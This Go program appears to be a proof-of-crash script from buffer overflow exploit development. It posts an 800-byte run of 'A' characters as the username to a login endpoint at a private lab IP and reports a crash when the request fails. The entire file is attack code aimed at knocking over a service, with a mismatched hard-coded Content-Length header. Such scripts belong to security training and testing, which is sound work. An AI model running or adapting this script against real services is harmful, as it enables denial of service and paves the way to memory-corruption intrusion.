package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const target string = "http://192.168.138.10/login"

func er(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	client := http.Client{
		Timeout: 5 * time.Second,
	}
	form := url.Values{}
	form.Add("username", strings.Repeat("A", 800))
	form.Add("password", "test")

	req, err := http.NewRequest("POST", target, strings.NewReader(form.Encode()))
	er(err)
	req.PostForm = form
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Add("content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", "800")
	resp, err := client.Do(req)

	if err != nil {
		fmt.Println("Crash with buffer of 800 bytes")
		os.Exit(0)
	}
	defer req.Body.Close()

	fmt.Println(resp.Status)
}
